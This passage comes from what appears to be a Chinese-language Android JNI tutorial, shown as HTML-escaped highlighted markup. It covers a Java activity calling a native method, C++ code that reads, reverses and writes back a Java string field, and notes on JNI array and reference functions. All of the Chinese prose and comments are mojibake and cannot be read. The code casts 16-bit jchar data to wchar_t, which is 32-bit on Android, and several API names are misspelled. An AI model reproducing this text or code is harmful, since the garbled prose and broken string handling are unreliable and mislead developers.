&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">findViewById&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">R&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">id&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">button&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">setOnClickListener&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="n">View&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">OnClickListener&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">onClick&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">View&lt;/span> &lt;span class="n">v&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">text&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">et&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getText&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">trim&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">callCppFunction&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">setText&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">native&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">callCppFunction&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;jni.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span>&lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span>&lt;span class="cpf">&amp;lt;algorithm&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="n">using&lt;/span> &lt;span class="n">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">extern&lt;/span> &lt;span class="s">&amp;#34;C&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">JNIEXPORT&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="n">JNICALL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">Java_com_example_naivete_jnidemo_MainActivity_callCppFunction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">JNIEnv&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jobject&lt;/span> &lt;span class="n">instance&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// TODO
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//è·å–text
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">jfieldID&lt;/span> &lt;span class="n">fid_tx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetFieldID&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetObjectClass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="s">&amp;#34;text&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;Ljava/lang/String;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//è·å–extå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">jstring&lt;/span> &lt;span class="n">j_tx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">jstring&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetObjectField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">fid_tx&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//ç¬¬ä¸€ç§æ–¹å¼
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//è·å¾—å­—ç¬¦ä¸²æŒ‡é’ˆï¼š
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="n">jchar&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">jstr1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetStringChars&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j_tx&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//zè½¬æ¢æˆå®½å­—ç¬¦
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">wstring&lt;/span> &lt;span class="nf">wstr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">wchar_t&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">jstr1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//é‡Šæ”¾æŒ‡é’ˆ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">ReleaseStringChars&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j_tx&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">jstr1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//ç¬¬ä¸€ç§END
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//ç¬¬äºŒç§
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="n">jchar&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">jstr2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetStringCritical&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j_tx&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">wstring&lt;/span> &lt;span class="nf">wstr2&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">wchar_t&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">jstr2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">ReleaseStringCritical&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j_tx&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">jstr2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//END
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//ç¬¬ä¸‰ç§
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">jsize&lt;/span> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetStringLength&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j_tx&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//è·å–é•¿åº¦
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">jchar&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">jstr3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new&lt;/span> &lt;span class="n">jchar&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">len&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jstr3&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">len&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sa">L&lt;/span>&lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//å¤åˆ¶
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">GetStringRegion&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j_tx&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">len&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">jstr3&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">wstring&lt;/span> &lt;span class="nf">wstr3&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">wchar_t&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">jstr3&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">delete&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="n">jstr3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//End
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//å€’åº
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">reverse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">wstr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">begin&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="n">wstr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">end&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">jstring&lt;/span> &lt;span class="n">j_new_str&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">NewString&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">jchar&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">wstr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">c_str&lt;/span>&lt;span class="p">(),(&lt;/span>&lt;span class="n">jint&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">wstr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">size&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">env&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="nf">SetObjectField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">instance&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">fid_tx&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">j_new_str&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-2-2.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>â€‹&lt;/p>
&lt;h3 id="25-ccä¸­æ“ä½œjavaä¸­çš„æ•°ç»„">2.5 C/C++ä¸­æ“ä½œJavaä¸­çš„æ•°ç»„&lt;/h3>
&lt;p>â€‹ åœ¨javaä¸­æ•°ç»„åˆ†ä¸ºä¸¤ç§ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>åŸºæœ¬ç±»å‹æ•°ç»„&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯¹è±¡ç±»å‹æ•°ç»„&lt;/p>
&lt;p>ä¸€ä¸ªèƒ½ç”¨äºä¸¤ç§ä¸åŒç±»å‹æ•°ç»„çš„å‡½æ•°æ˜¯ï¼šGetArrayLength(jarray array)ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="251-æ“ä½œåŸºæœ¬ç±»å‹çš„æ•°ç»„">2.5.1 æ“ä½œåŸºæœ¬ç±»å‹çš„æ•°ç»„&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>GetArrayElementsæ–¹æ³•&lt;code>Get&amp;lt;Type&amp;gt;ArrayElements(&amp;lt;Type&amp;gt;Array arr,jboolean* isCopide)&lt;/code>&lt;/p>
&lt;p>æŠŠJavaä¸­çš„åŸºæœ¬ç±»å‹çš„æ•°ç»„è½¬æ¢æˆC++ä¸­çš„æ•°ç»„ ä¸¤ç§æ–¹å¼ï¼š&lt;/p>
&lt;p>ä¸€æ˜¯æ‹·è´ä¸€ä»½ä¼ å›æœ¬åœ°ï¼Œå¦å¤–ä¸€ç§æ˜¯æŠŠæŒ‡å‘Javaæ•°ç»„çš„æŒ‡é’ˆç›´æ¥ä¼ å›åˆ°æœ¬åœ°ä»£ç ä¸­&lt;/p>
&lt;p>å¤„ç†å®Œåï¼Œé€šè¿‡ReleaseArrayelements æ¥é‡Šæ”¾æ•°ç»„ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ReleaseArrayelement æ–¹æ³•&lt;code>Release&amp;lt;Type&amp;gt;Arrayelement(Type&amp;gt;Array arr,&amp;lt;Type&amp;gt;* array,jint mode)&lt;/code>&lt;/p>
&lt;p>è¿™ä¸ªå‡½æ•°å¯ä»¥é€‰æ‹©å¦‚ä½•å¤„ç†Javaå’ŒC++ä¸­çš„æ•°ç»„ï¼Œæ˜¯æäº¤è¿˜æ˜¯æ’¤é”€Â·Â·Â·Â·å†…å­˜æ˜¯å¦é‡Šæ”¾ç­‰ç­‰ã€‚&lt;/p>
&lt;p>modeçš„å–å€¼ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>0ï¼šå¯¹Javaçš„æ•°ç»„è¿›è¡Œæ›´æ–°å¹¶ä¸”é‡Šæ”¾C/C++æ•°ç»„&lt;/p>
&lt;/li>
&lt;li>
&lt;p>JNI_COMMITï¼šæ›´æ–°ä½†æ˜¯ä¸é‡Šæ”¾&lt;/p>
&lt;/li>
&lt;li>
&lt;p>JNI_ABOUTï¼šä¸æ›´æ–°ï¼Œé‡Šæ”¾ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>GetPrimittiveArrayCriticalæ–¹æ³•&lt;/p>
&lt;p>&lt;code>GetPrimittiveArrayCritical(jarray arr,jboolean* isCopied)&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ReleasePrimittiveArrayCriticalæ–¹æ³•&lt;/p>
&lt;p>&lt;code>ReleasePrimittiveArrayCritical(jarray arr,void* array,jint mode)&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>GetArrayRegionæ–¹æ³•&lt;code>Get&amp;lt;type&amp;gt;ArrayRegion(&amp;lt;Type&amp;gt;Arryay arr,jsize strat ,jsize len,&amp;lt;Type&amp;gt;* buffer)&lt;/code>&lt;/p>
&lt;p>åœ¨C++ä¸­å¼€è¾Ÿå†…å­˜ï¼Œæ‹·è´æ•°ç»„åˆ°å†…å­˜ä¸­ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>SetArrayRegion&lt;code>Set&amp;lt;type&amp;gt;ArrayRegion(&amp;lt;Type&amp;gt;Arryay arr,jsize strat ,jsize len,const &amp;lt;Type&amp;gt;* buffer)&lt;/code>&lt;/p>
&lt;p>æŠŠJavaåŸºæœ¬ç±»å‹æ•°ç»„ä¸­çš„æŒ‡å®šèŒƒå›´çš„å…ƒç´ ç”¨C++æ•°ç»„ä¸­çš„å…ƒç´ æ¥èµ‹å€¼ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ArrayNewæ–¹æ³•&lt;code>&amp;lt;Type&amp;gt;ArrayNew&amp;lt;Type&amp;gt;Array(jszie sz)&lt;/code>&lt;/p>
&lt;p>æŒ‡å®šä¸€ä¸ªé•¿åº¦ç„¶åè¿”å›ç›¸åº”çš„JavaåŸºæœ¬ç±»å‹çš„æ•°ç»„ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="252-æ“ä½œå¯¹è±¡æ•°ç»„ç±»å‹">2.5.2 æ“ä½œå¯¹è±¡æ•°ç»„ç±»å‹&lt;/h3>
&lt;p>â€‹ JNIæœªæä¾›æŠŠJavaå¯¹è±¡æ•°ç»„ ç›´æ¥è½¬åˆ°C++å¯¹è±¡æ•°ç»„çš„å‡½æ•°ã€‚è€Œæ˜¯é€šè¿‡&lt;code>Get/SetObjectArrayaElement&lt;/code>è¿™æ ·çš„å‡½æ•°æ¥å¯¹javaä¸­çš„å¯¹è±¡æ•°ç»„è¿›è¡Œæ“ä½œã€‚å› ä¸ºæœªæ‹·è´ æ‰€ä»¥æ²¡æœ‰é‡Šæ”¾æ“ä½œã€‚&lt;code>NewObjectArray&lt;/code>å¯ä»¥é€šè¿‡æŒ‡å®šé•¿åº¦å’Œåˆå§‹å€¼æ¥åˆ›å»ºæŸä¸€ä¸ªç±»çš„æ•°ç»„ã€‚&lt;/p>
&lt;p>ä¾‹å­ï¼šä¸¤ç§ç±»å‹çš„æ“ä½œï¼š&lt;/p>
&lt;p>ç•¥Â·Â·Â·Â·Â·&lt;/p>
&lt;p>â€‹ æ³¨ï¼šä¹¦æœ¬P34-36&lt;/p>
&lt;h3 id="26-ccä¸­çš„å¼•ç”¨ç±»å‹å’Œidç¼“å­˜">2.6 C++/Cä¸­çš„å¼•ç”¨ç±»å‹å’ŒIDç¼“å­˜&lt;/h3>
&lt;h3 id="261-å¼•ç”¨ç±»å‹">2.6.1 å¼•ç”¨ç±»å‹&lt;/h3>
&lt;p>â€‹ ä»Javaåˆ›å»ºå¯¹è±¡ä¼ åˆ°æœ¬åœ°C/C++ä»£ç æ—¶ä¼šäº§ç”Ÿå¼•ç”¨ï¼Œæ ¹æ®Javaçš„åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œåªè¦å­˜åœ¨å¼•ç”¨å°±ä¸ä¼šè§¦å‘æ”¹å¼•ç”¨æ‰€æŒ‡çš„Javaå¯¹è±¡åƒåœ¾å›æ”¶ã€‚&lt;/p>
&lt;p>â€‹ å‡ ç§C/C++ä¸­çš„å¼•ç”¨ç±»å‹ï¼š&lt;/p>
&lt;ol>
&lt;li>
&lt;p>å±€éƒ¨å¼•ç”¨ï¼šï¼ˆæœ€å¸¸è§ï¼‰&lt;/p>
&lt;p>å±€éƒ¨å¼•ç”¨åªåœ¨è¯¥nativeå‡½æ•°ä¸­æœ‰ç”¨ï¼Œæ‰€æœ‰åœ¨è¯¥å‡½æ•°ä¸­äº§ç”Ÿçš„å±€éƒ¨å¼•ç”¨ï¼Œéƒ½ä¼šåœ¨å‡½æ•°è¿”å›æ—¶è‡ªåŠ¨é‡Šæ”¾ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨DeleteLocalRefå‡½æ•°æ‰‹åŠ¨é‡Šæ”¾ã€‚&lt;/p>
&lt;p>æœ‰æ•ˆæœŸä¸­èƒ½ä¼ é€’åˆ°åˆ«çš„æœ¬åœ°å‡½æ•°ä¸­ï¼Œåƒä¸‡ä¸è¦ç”¨C++å…¨å±€å˜é‡ä¿å­˜å®ƒï¼Œæˆ–è€…æŠŠå®ƒå®šä¹‰ä¸ºC++é™æ€å±€éƒ¨å˜é‡ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å…¨å±€å¼•ç”¨ï¼š&lt;/p>
&lt;p>å¯ä»¥è·¨è¶Šå½“å‰çº¿ç¨‹ï¼Œåœ¨å¯¹ä¸ªnativeå‡½æ•°ä¸­æœ‰æ•ˆï¼Œéœ€è¦æ‰‹åŠ¨é‡Šæ”¾ã€‚ä¼šé˜»æ­¢åƒåœ¾å›æ”¶å™¨å›æ”¶è¿™ä¸ªå¼•ç”¨æ‰€æŒ‡çš„å¯¹è±¡ã€‚&lt;/p>
&lt;p>ä¸åŒäºå±€éƒ¨å¼•ç”¨ï¼Œå…¨å±€å¼•ç”¨çš„åˆ›å»ºä¸æ˜¯ç”±JNIè‡ªåŠ¨åˆ›å»ºçš„ï¼Œå…¨å±€å¼•ç”¨æ˜¯éœ€è¦è°ƒç”¨NewGlobalRefå‡½æ•°ï¼Œé‡Šæ”¾ä½¿ç”¨ReleaseGlobalRefå‡½æ•°ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¼±å…¨å±€å¼•ç”¨&lt;/p>
&lt;p>ä¸å…¨å±€å¼•ç”¨ç›¸ä¼¼ã€‚ä¸ä¸€æ ·çš„ä¸ºä¸ä¼šé˜»æ­¢åƒåœ¾å›æ”¶å™¨å›æ”¶è¿™ä¸ªå¼•ç”¨æ‰€æŒ‡å¯¹è±¡ï¼Œä½¿ç”¨NewWeakGlobalRefå’ŒReleaseWeakGlobalRefæ¥äº§ç”Ÿå’Œé‡Šæ”¾ã€‚&lt;/p>
&lt;p>å…³äºå¼•ç”¨çš„ä¸€äº›å‡½æ•°ï¼š&lt;/p>
&lt;p>&lt;code>jobject NewGlobalRef(jobject obj)&lt;/code>&lt;/p>
&lt;p>&lt;code>jobject NewLocalRef(jobject obj)&lt;/code>&lt;/p>
&lt;p>&lt;code>jobject New WeakGlobalRef(jobject obj)&lt;/code>&lt;/p>
&lt;p>&lt;code>void DeleteGlobalRef(jobject obj)&lt;/code>&lt;/p>
&lt;p>&lt;code>void DeleteLocalRef(jobject obj)&lt;/code>&lt;/p>
&lt;p>&lt;code>void DeleteWeakGlobalRef(jobject obj)&lt;/code>&lt;/p>
&lt;p>å¾ˆå®¹æ˜“ç†è§£ä¸Šé¢6ä¸ªå‡½æ•°&lt;/p>
&lt;p>&lt;code>jboolean IsSameObject(jobject obj1,jobject obj2)&lt;/code>&lt;/p>
&lt;p>è¿™ä¸ªå‡½æ•°ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªå¼•ç”¨æ˜¯å¦ç›¸ç­‰ï¼Œä½†æ˜¯å¯¹äºå¼±å¼•ç”¨æœ‰ä¸€ä¸ªç‰¹åˆ«çš„åŠŸèƒ½ï¼Œå¦‚æœæŠŠNULLä¼ å…¥è¦æ¯”è¾ƒçš„å¯¹è±¡ä¸­å°±èƒ½åˆ¤æ–­å¼±å…¨å±€å¼•ç”¨æ‰€æŒ‡çš„Javaå¯¹è±¡æ˜¯å¦è¢«å›æ”¶ã€‚&lt;/p>
&lt;p>ç¼“å­˜jfieldID/jmethodID.å‡å°æŸ¥è¯¢å¼€é”€ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
